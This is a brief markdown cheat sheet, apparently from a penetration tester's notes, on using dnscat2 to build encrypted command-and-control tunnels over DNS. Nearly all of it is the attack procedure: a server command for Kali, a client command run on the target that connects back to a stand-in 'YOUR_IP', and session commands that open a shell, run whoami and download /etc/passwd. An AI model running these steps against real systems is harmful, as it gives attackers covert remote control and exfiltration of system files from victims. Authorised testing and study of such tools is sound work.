---
tags: [tool, tunneling]
tool: dnscat2
category: Tunneling
installed: true
---

# dnscat2 - DNS Tunneling

## Overview
Create encrypted command & control tunnels over DNS

## Location
/usr/bin/dnscat2

## Usage

### Server (Kali)
dnscat2-server

### Client (Target)
dnscat2 --dns server=YOUR_IP,port=53

### Commands
sessions
session -i 1
shell
exec whoami
download /etc/passwd
